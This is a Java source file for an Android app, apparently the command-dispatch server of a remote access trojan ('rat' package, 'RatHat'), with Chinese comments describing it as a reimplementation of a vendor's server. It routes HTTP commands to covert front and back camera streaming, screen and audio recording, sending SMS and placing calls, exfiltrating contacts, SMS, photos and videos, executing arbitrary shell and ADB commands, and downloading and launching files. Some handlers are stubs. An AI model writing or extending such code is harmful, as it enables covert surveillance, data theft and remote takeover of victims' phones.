package com.vendor.rat.control.server;

import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.vendor.rat.control.entity.ADBConfig;
import com.vendor.rat.control.entity.AdbShellResult;

import java.util.concurrent.atomic.AtomicInteger;

/**
 * HTTP 指令服务器 — 对应 vendor server/b.java
 *
 * vendor b.java 是一个本地 HTTP 服务器，通过 URL 路由分发指令。
 * 共 232 个 public static 方法，127 个核心路由 + 95 个 /target/ 路由。
 *
 * 本类负责:
 *   1. 启动/停止本地 HTTP 服务
 *   2. 路由分发到各 Handler
 *   3. 统一响应格式 (ApiResult JSON)
 */
public final class HttpCommandServer {

    private static final String TAG = "HttpCommandServer";

    private static volatile HttpCommandServer instance;
    public static final AtomicInteger serverState = new AtomicInteger(-1);

    private final Gson gson;
    private final DeviceInfoHandler deviceInfoHandler;
    private final DeviceControlHandler deviceControlHandler;
    private final AppManageHandler appManageHandler;
    private final NodeSearchHandler nodeSearchHandler;
    private final FileOperationHandler fileOperationHandler;
    private final AdbOperationHandler adbOperationHandler;
    private final MediaCaptureHandler mediaCaptureHandler;
    private final CommunicationHandler communicationHandler;
    private final SyncDataHandler syncDataHandler;

    public HttpCommandServer() {
        gson = new Gson();
        deviceInfoHandler = new DeviceInfoHandler();
        deviceControlHandler = new DeviceControlHandler();
        appManageHandler = new AppManageHandler();
        nodeSearchHandler = new NodeSearchHandler();
        fileOperationHandler = new FileOperationHandler();
        adbOperationHandler = new AdbOperationHandler();
        mediaCaptureHandler = new MediaCaptureHandler();
        communicationHandler = new CommunicationHandler();
        syncDataHandler = new SyncDataHandler();
    }

    public static HttpCommandServer getInstance() {
        if (instance == null) {
            synchronized (HttpCommandServer.class) {
                if (instance == null) {
                    instance = new HttpCommandServer();
                }
            }
        }
        return instance;
    }

    // ADAPT: vendor uses AsyncHttpServer library (l0.f)
    // We use a simplified dispatch interface

    /**
     * 路由分发 — 对应 vendor server/b.java 的 235 个路由
     * 接收路径和请求体，分发到对应 handler
     *
     * @param path 路由路径 (如 "/info", "/global/lockScreen", "/target/findByText")
     * @param body 请求体 JSON
     * @return 响应 JSON
     */
    public String dispatch(String path, String body) {
        if (path == null || path.isEmpty()) return errorResponse("empty path");
        try {
            // --- 设备信息 ---
            if (path.equals("/info") || path.equals("/index")) return "ok"; // TODO: deviceInfoHandler
            if (path.equals("/version")) return "ok";
            if (path.equals("/deviceId")) return "ok";
            if (path.equals("/screenState")) { deviceInfoHandler.getScreenState(); return "ok"; }
            if (path.equals("/lockState")) { deviceInfoHandler.getLockState(); return "ok"; }
            if (path.equals("/batteryState")) { deviceInfoHandler.getBatteryState(); return "ok"; }
            if (path.equals("/netState")) { deviceInfoHandler.getNetState(); return "ok"; }
            if (path.equals("/callState")) { deviceInfoHandler.getCallState(); return "ok"; }
            if (path.equals("/containerState")) { deviceInfoHandler.getContainerState(); return "ok"; }
            if (path.equals("/recordState")) { deviceInfoHandler.getRecordState(); return "ok"; }
            if (path.equals("/permissions")) { deviceInfoHandler.getPermissions(); return "ok"; }
            if (path.equals("/packages")) { deviceInfoHandler.getPackages(); return "ok"; }
            if (path.equals("/deviceAdmin")) { deviceInfoHandler.getDeviceAdmin(); return "ok"; }
            if (path.equals("/mainPackageName")) { deviceInfoHandler.getMainPackageName(); return "ok"; }
            if (path.equals("/accessibilityState")) return "ok";
            if (path.equals("/pairState")) { deviceInfoHandler.getPairState(); return "ok"; }

            // --- 全局操作 ---
            if (path.equals("/global/lockScreen")) { deviceControlHandler.lockScreen(); return "ok"; }
            if (path.equals("/global/wakeUpScreen")) { deviceControlHandler.wakeUpScreen(); return "ok"; }
            if (path.equals("/global/keepScreenOn")) { deviceControlHandler.keepScreenOn(true); return "ok"; }
            if (path.equals("/global/setText")) { deviceControlHandler.setText(body); return "ok"; }
            if (path.equals("/global/copy")) { deviceControlHandler.copy(); return "ok"; }
            if (path.equals("/global/paste")) { deviceControlHandler.paste(); return "ok"; }
            if (path.equals("/global/delete")) { deviceControlHandler.delete(); return "ok"; }
            if (path.equals("/global/clear")) { deviceControlHandler.clearText(); return "ok"; }
            if (path.equals("/global/moveHome")) { deviceControlHandler.moveHome(); return "ok"; }
            if (path.equals("/global/moveEnd")) { deviceControlHandler.moveEnd(); return "ok"; }
            if (path.equals("/global/execCommand")) { deviceControlHandler.execCommand(new String[]{body}); return "ok"; }
            if (path.equals("/global/action")) { deviceControlHandler.globalAction(body, null, null, null, null); return "ok"; }

            // --- 截图/录屏 ---
            if (path.equals("/screenshot/0")) { mediaCaptureHandler.screenshot(); return "ok"; }
            if (path.equals("/screenrecord/start")) { mediaCaptureHandler.startScreenRecord(); return "ok"; }
            if (path.equals("/screenrecord/stop")) { mediaCaptureHandler.stopScreenRecord(); return "ok"; }
            if (path.equals("/screenrecord/state")) { mediaCaptureHandler.getScreenRecordState(); return "ok"; }
            if (path.equals("/startRecord")) { mediaCaptureHandler.startRecord(0); return "ok"; }
            if (path.equals("/stopRecord")) { mediaCaptureHandler.stopRecord(); return "ok"; }
            if (path.equals("/frontCameraLive")) { mediaCaptureHandler.frontCameraLive(); return "ok"; }
            if (path.equals("/backCameraLive")) { mediaCaptureHandler.backCameraLive(); return "ok"; }
            if (path.equals("/stopCameraLive")) { mediaCaptureHandler.stopCameraLive(); return "ok"; }
            if (path.equals("/miniCap/scale")) return "ok";

            // --- 应用管理 ---
            if (path.equals("/browserApps")) { appManageHandler.browserApps(); return "ok"; }
            if (path.equals("/killApp")) { appManageHandler.killApp(body); return "ok"; }
            if (path.equals("/startApp")) { appManageHandler.startApp(body, null); return "ok"; }

            // --- 通信 ---
            if (path.equals("/callPhone")) { communicationHandler.callPhone(body); return "ok"; }
            if (path.equals("/sendSms")) { communicationHandler.sendSms(body, null); return "ok"; }
            if (path.equals("/contacts")) { return "ok"; } // TODO: communicationHandler.getContacts

            // --- 数据同步 ---
            if (path.startsWith("/sync")) { return dispatchSync(path, body); }

            // --- 启动操作 ---
            if (path.startsWith("/start")) { return dispatchStart(path, body); }

            // --- ADB 操作 (non-/local routes) ---
            if (path.equals("/openWifiDebug")) { return gson.toJson(adbOperationHandler.openWifiDebug()); }
            if (path.equals("/closeWifiDebug")) { return gson.toJson(adbOperationHandler.closeWifiDebug()); }
            if (path.equals("/enableWifiDebug")) { return gson.toJson(adbOperationHandler.enableWifiDebug()); }
            if (path.equals("/reloadPairKeyFiles")) { adbOperationHandler.reloadPairKeyFiles(); return "ok"; }
            if (path.equals("/installRatHat")) { adbOperationHandler.installRatHat(); return "ok"; }
            if (path.equals("/updateRatHat")) { adbOperationHandler.updateRatHat(); return "ok"; }
            if (path.equals("/stopRatHat")) { adbOperationHandler.stopRatHat(); return "ok"; }
            if (path.equals("/shareADBConfig")) { adbOperationHandler.shareADBConfig(); return "ok"; }
            if (path.equals("/requestLocalAdbPair")) { adbOperationHandler.requestLocalAdbPair(); return "ok"; }
            if (path.equals("/requestLocalKeepAlive")) { adbOperationHandler.requestLocalKeepAlive(); return "ok"; }

            // --- ADB 操作 (/local* routes) ---
            if (path.startsWith("/local")) { return dispatchLocal(path, body); }

            // --- /target/ UI 节点操作 ---
            if (path.startsWith("/target/")) { return dispatchTarget(path, body); }

            // --- 其他 ---
            if (path.equals("/blockView")) return "ok";
            if (path.equals("/unlock")) return "ok";
            if (path.equals("/enterCipher")) return "ok";
            if (path.equals("/confirmLock")) return "ok";
            if (path.equals("/deleteFile")) return "ok";
            if (path.equals("/readScreenWindow")) return "ok";
            if (path.equals("/refreshActiveWindow")) return "ok";

            Log.w(TAG, "Unknown route: " + path);
            return errorResponse("unknown route: " + path);
        } catch (Exception e) {
            Log.e(TAG, "dispatch error: " + path, e);
            return errorResponse(e.getMessage());
        }
    }

    private String dispatchSync(String path, String body) {
        switch (path) {
            case "/syncContacts": syncDataHandler.syncContacts(); break;
            case "/syncSms": syncDataHandler.syncSms(); break;
            case "/syncPackages": syncDataHandler.syncPackages(); break;
            case "/syncPermissions": syncDataHandler.syncPermissions(); break;
            case "/syncPhotos": syncDataHandler.syncPhotos(); break;
            case "/syncVideos": syncDataHandler.syncVideos(); break;
            case "/syncAudios": syncDataHandler.syncAudios(); break;
            case "/syncWindows": break; // TODO: syncWindows
            case "/syncADBConfig": {
                ADBConfig config = adbOperationHandler.syncADBConfig();
                return gson.toJson(config);
            }
            case "/syncPowerControl": break;
            case "/syncLockCipher": break;
            case "/syncDownload": break;
            case "/syncCanWriteSecure": break;
            case "/syncAdminActivating": break;
            case "/syncSmsRecognizePlug": break;
            default: return errorResponse("unknown sync: " + path);
        }
        return "ok";
    }

    private String dispatchStart(String path, String body) {
        switch (path) {
            case "/startApp": appManageHandler.startApp(body, null); break;
            case "/startSettings": appManageHandler.startSettings(); break;
            case "/startAccessibility": appManageHandler.startAccessibility(); break;
            case "/startAdminActive": appManageHandler.startAdminActive(); break;
            case "/startDevSetting": appManageHandler.startDevSetting(); break;
            case "/startWifiSetting": appManageHandler.startWifiSetting(); break;
            case "/startAppDetailSetting": appManageHandler.startAppDetailSetting(); break;
            case "/startAboutDevice": appManageHandler.startAboutDevice(); break;
            case "/startAppFromDesktop": appManageHandler.startAppFromDesktop(body, null); break;
            case "/startVerifyCredential": break;
            case "/startInstallApp": break;
            case "/startRecord": mediaCaptureHandler.startRecord(0); break;
            case "/startRatHat": adbOperationHandler.startRatHat(); break;
            default: return errorResponse("unknown start: " + path);
        }
        return "ok";
    }

    private String dispatchLocal(String path, String body) {
        switch (path) {
            case "/localAdbConnect": {
                boolean result = adbOperationHandler.localAdbConnect();
                return gson.toJson(result);
            }
            case "/localAdbPair": {
                if (body != null && !body.isEmpty()) {
                    try {
                        JsonObject json = JsonParser.parseString(body).getAsJsonObject();
                        String host = json.has("host") ? json.get("host").getAsString() : null;
                        String pairPort = json.has("pairPort") ? json.get("pairPort").getAsString() : null;
                        String pairCode = json.has("pairCode") ? json.get("pairCode").getAsString() : null;
                        boolean directConnect = json.has("directConnect") && json.get("directConnect").getAsBoolean();
                        boolean result = adbOperationHandler.localAdbPair(host, pairPort, pairCode, directConnect);
                        return gson.toJson(result);
                    } catch (Exception e) {
                        Log.e(TAG, "localAdbPair body parse error", e);
                        return gson.toJson(false);
                    }
                }
                return gson.toJson(false);
            }
            case "/localAdbPush": {
                if (body != null && !body.isEmpty()) {
                    try {
                        JsonObject json = JsonParser.parseString(body).getAsJsonObject();
                        String logId = json.has("logId") ? json.get("logId").getAsString() : null;
                        String fileUrl = json.has("fileUrl") ? json.get("fileUrl").getAsString() : null;
                        String fileName = json.has("fileName") ? json.get("fileName").getAsString() : null;
                        String startCommand = json.has("startCommand") ? json.get("startCommand").getAsString() : null;
                        adbOperationHandler.localAdbPush(logId, fileUrl, fileName, startCommand);
                    } catch (Exception e) {
                        Log.e(TAG, "localAdbPush body parse error", e);
                    }
                }
                return "ok";
            }
            case "/localAdbShell": {
                String command = body;
                // Support both raw string body and JSON { "command": "..." }
                if (body != null && !body.isEmpty() && body.trim().startsWith("{")) {
                    try {
                        JsonObject json = JsonParser.parseString(body).getAsJsonObject();
                        if (json.has("command")) {
                            command = json.get("command").getAsString();
                        }
                    } catch (Exception ignored) {
                        // Use body as-is if JSON parse fails
                    }
                }
                AdbShellResult result = adbOperationHandler.localAdbShell(command);
                return gson.toJson(result);
            }
            case "/localBackAppState": break;
            case "/localDebugPort": break;
            default: return errorResponse("unknown local: " + path);
        }
        return "ok";
    }

    private String dispatchTarget(String path, String body) {
        String sub = path.substring("/target/".length());
        Log.d(TAG, "target route: " + sub);
        // ADAPT: vendor server/b.java 93 个 /target/ 路由
        // 参数从 body JSON 解析 (简化: 传 body 作为 text/delegateId)
        String d = null, c = body, r = null; int t = 0;
        switch (sub) {
            // --- findBy* (返回集合) ---
            case "findByText": nodeSearchHandler.findByText(d, c, r, t); break;
            case "findByTextContains": nodeSearchHandler.findByTextContains(d, c, r, t); break;
            case "findByTextEndsWith": nodeSearchHandler.findByTextEndsWith(d, c, r, t); break;
            case "findByTextMatches": nodeSearchHandler.findByTextMatches(d, c, r, t); break;
            case "findByTextStartsWith": nodeSearchHandler.findByTextStartsWith(d, c, r, t); break;
            case "findByDesc": nodeSearchHandler.findByDesc(d, c, r, t); break;
            case "findByDescContains": nodeSearchHandler.findByDescContains(d, c, r, t); break;
            case "findByDescEndsWith": nodeSearchHandler.findByDescEndsWith(d, c, r, t); break;
            case "findByDescMatches": nodeSearchHandler.findByDescMatches(d, c, r, t); break;
            case "findByDescStartsWith": nodeSearchHandler.findByDescStartsWith(d, c, r, t); break;
            case "findById": nodeSearchHandler.findById(d, c, r, t); break;
            case "findByIdContains": nodeSearchHandler.findByIdContains(d, c, r, t); break;
            case "findByIdEndsWith": nodeSearchHandler.findByIdEndsWith(d, c, r, t); break;
            case "findByIdMatches": nodeSearchHandler.findByIdMatches(d, c, r, t); break;
            case "findByIdStartsWith": nodeSearchHandler.findByIdStartsWith(d, c, r, t); break;
            case "findByClassName": nodeSearchHandler.findByClassName(d, c, r, t); break;
            case "findByClassNameContains": nodeSearchHandler.findByClassNameContains(d, c, r, t); break;
            case "findByClassNameEndsWith": nodeSearchHandler.findByClassNameEndsWith(d, c, r, t); break;
            case "findByClassNameMatches": nodeSearchHandler.findByClassNameMatches(d, c, r, t); break;
            case "findByClassNameStartsWith": nodeSearchHandler.findByClassNameStartsWith(d, c, r, t); break;
            // --- findOneBy* (返回单个) ---
            case "findOneByText": nodeSearchHandler.findOneByText(d, c, r, t); break;
            case "findOneByTextContains": nodeSearchHandler.findOneByTextContains(d, c, r, t); break;
            case "findOneByTextEndsWith": nodeSearchHandler.findOneByTextEndsWith(d, c, r, t); break;
            case "findOneByTextMatches": nodeSearchHandler.findOneByTextMatches(d, c, r, t); break;
            case "findOneByTextStartsWith": nodeSearchHandler.findOneByTextStartsWith(d, c, r, t); break;
            case "findOneByDesc": nodeSearchHandler.findOneByDesc(d, c, r, t); break;
            case "findOneByDescContains": nodeSearchHandler.findOneByDescContains(d, c, r, t); break;
            case "findOneByDescEndsWith": nodeSearchHandler.findOneByDescEndsWith(d, c, r, t); break;
            case "findOneByDescMatches": nodeSearchHandler.findOneByDescMatches(d, c, r, t); break;
            case "findOneByDescStartsWith": nodeSearchHandler.findOneByDescStartsWith(d, c, r, t); break;
            case "findOneById": nodeSearchHandler.findOneById(d, c, r, t); break;
            case "findOneByIdContains": nodeSearchHandler.findOneByIdContains(d, c, r, t); break;
            case "findOneByIdEndsWith": nodeSearchHandler.findOneByIdEndsWith(d, c, r, t); break;
            case "findOneByIdMatches": nodeSearchHandler.findOneByIdMatches(d, c, r, t); break;
            case "findOneByIdStartsWith": nodeSearchHandler.findOneByIdStartsWith(d, c, r, t); break;
            case "findOneByClassName": nodeSearchHandler.findOneByClassName(d, c, r, t); break;
            case "findOneByClassNameContains": nodeSearchHandler.findOneByClassNameContains(d, c, r, t); break;
            case "findOneByClassNameEndsWith": nodeSearchHandler.findOneByClassNameEndsWith(d, c, r, t); break;
            case "findOneByClassNameMatches": nodeSearchHandler.findOneByClassNameMatches(d, c, r, t); break;
            case "findOneByClassNameStartsWith": nodeSearchHandler.findOneByClassNameStartsWith(d, c, r, t); break;
            // --- findLastBy* (返回最后一个) ---
            case "findLastByText": nodeSearchHandler.findLastByText(d, c, r, t); break;
            case "findLastByTextContains": nodeSearchHandler.findLastByTextContains(d, c, r, t); break;
            case "findLastByTextEndsWith": nodeSearchHandler.findLastByTextEndsWith(d, c, r, t); break;
            case "findLastByTextMatches": nodeSearchHandler.findLastByTextMatches(d, c, r, t); break;
            case "findLastByTextStartsWith": nodeSearchHandler.findLastByTextStartsWith(d, c, r, t); break;
            case "findLastByDesc": nodeSearchHandler.findLastByDesc(d, c, r, t); break;
            case "findLastByDescContains": nodeSearchHandler.findLastByDescContains(d, c, r, t); break;
            case "findLastByDescEndsWith": nodeSearchHandler.findLastByDescEndsWith(d, c, r, t); break;
            case "findLastByDescMatches": nodeSearchHandler.findLastByDescMatches(d, c, r, t); break;
            case "findLastByDescStartsWith": nodeSearchHandler.findLastByDescStartsWith(d, c, r, t); break;
            case "findLastById": nodeSearchHandler.findLastById(d, c, r, t); break;
            case "findLastByIdContains": nodeSearchHandler.findLastByIdContains(d, c, r, t); break;
            case "findLastByIdEndsWith": nodeSearchHandler.findLastByIdEndsWith(d, c, r, t); break;
            case "findLastByIdMatches": nodeSearchHandler.findLastByIdMatches(d, c, r, t); break;
            case "findLastByIdStartsWith": nodeSearchHandler.findLastByIdStartsWith(d, c, r, t); break;
            case "findLastByClassName": nodeSearchHandler.findLastByClassName(d, c, r, t); break;
            case "findLastByClassNameContains": nodeSearchHandler.findLastByClassNameContains(d, c, r, t); break;
            case "findLastByClassNameEndsWith": nodeSearchHandler.findLastByClassNameEndsWith(d, c, r, t); break;
            case "findLastByClassNameMatches": nodeSearchHandler.findLastByClassNameMatches(d, c, r, t); break;
            case "findLastByClassNameStartsWith": nodeSearchHandler.findLastByClassNameStartsWith(d, c, r, t); break;
            // --- combine/or/parent/child ---
            case "findByCombine": nodeSearchHandler.findByCombine(body); break;
            case "findByCombineWithChild": nodeSearchHandler.findByCombineWithChild(body); break;
            case "findByCombineWithoutChild": nodeSearchHandler.findByCombineWithoutChild(body); break;
            case "findByOperateOr": nodeSearchHandler.findByOperateOr(body); break;
            case "findOneByCombine": nodeSearchHandler.findOneByCombine(body); break;
            case "findOneByCombineWithChild": nodeSearchHandler.findOneByCombineWithChild(body); break;
            case "findOneByCombineWithoutChild": nodeSearchHandler.findOneByCombineWithoutChild(body); break;
            case "findOneByCombineWithParent": nodeSearchHandler.findOneByCombineWithParent(body); break;
            case "findOneByOperateOr": nodeSearchHandler.findOneByOperateOr(body); break;
            case "findLastByCombine": nodeSearchHandler.findLastByCombine(body); break;
            case "findParentByCombine": nodeSearchHandler.findParentByCombine(body); break;
            case "findParentByCombineWithUpLevel": nodeSearchHandler.findParentByCombineWithUpLevel(body); break;
            case "findParentUtilCombine": nodeSearchHandler.findParentUtilCombine(body); break;
            case "findChildUtilUpLevel": nodeSearchHandler.findChildUtilUpLevel(body); break;
            // --- scroll ---
            case "scrollForwardUtilWithCombine": nodeSearchHandler.scrollForwardUtilWithCombine(body); break;
            case "scrollForwardUtilWithChild": nodeSearchHandler.scrollForwardUtilWithChild(body); break;
            case "scrollForwardUtilWithoutChild": nodeSearchHandler.scrollForwardUtilWithoutChild(body); break;
            case "scrollForwardUtilWithOperateOr": nodeSearchHandler.scrollForwardUtilWithOperateOr(body); break;
            case "scrollBackwardUtilWithCombine": nodeSearchHandler.scrollBackwardUtilWithCombine(body); break;
            case "scrollBackwardUtilWithChild": nodeSearchHandler.scrollBackwardUtilWithChild(body); break;
            case "scrollBackwardUtilWithoutChild": nodeSearchHandler.scrollBackwardUtilWithoutChild(body); break;
            case "scrollBackwardUtilWithOperateOr": nodeSearchHandler.scrollBackwardUtilWithOperateOr(body); break;
            case "scrollForwardUtilMultipleWithCombine": nodeSearchHandler.scrollForwardUtilMultipleWithCombine(body); break;
            case "scrollForwardUtilMultipleWithChild": nodeSearchHandler.scrollForwardUtilMultipleWithChild(body); break;
            case "scrollForwardUtilMultipleWithoutChild": nodeSearchHandler.scrollForwardUtilMultipleWithoutChild(body); break;
            case "scrollForwardUtilMultipleWithOperateOr": nodeSearchHandler.scrollForwardUtilMultipleWithOperateOr(body); break;
            case "scrollBackwardUtilMultipleWithCombine": nodeSearchHandler.scrollBackwardUtilMultipleWithCombine(body); break;
            case "scrollBackwardUtilMultipleWithChild": nodeSearchHandler.scrollBackwardUtilMultipleWithChild(body); break;
            case "scrollBackwardUtilMultipleWithoutChild": nodeSearchHandler.scrollBackwardUtilMultipleWithoutChild(body); break;
            case "scrollBackwardUtilMultipleWithOperateOr": nodeSearchHandler.scrollBackwardUtilMultipleWithOperateOr(body); break;
            // --- action/refresh/match ---
            case "action": nodeSearchHandler.targetAction(body); break;
            case "refresh": nodeSearchHandler.targetRefresh(); break;
            case "matchListenWindow": nodeSearchHandler.matchListenWindow(body); break;
            default:
                Log.w(TAG, "Unknown target route: " + sub);
                return errorResponse("unknown target: " + sub);
        }
        return "ok";
    }

    private static String errorResponse(String msg) {
        return "{\"success\":false,\"msg\":\"" + msg + "\"}";
    }

    /**
     * 停止服务 — 对应 vendor f3()
     */
    public void stop() {
        try {
            serverState.set(0);
            Log.d(TAG, "HttpCommandServer stopped");
        } catch (Exception e) {
            Log.e(TAG, "stop error", e);
        }
    }
}
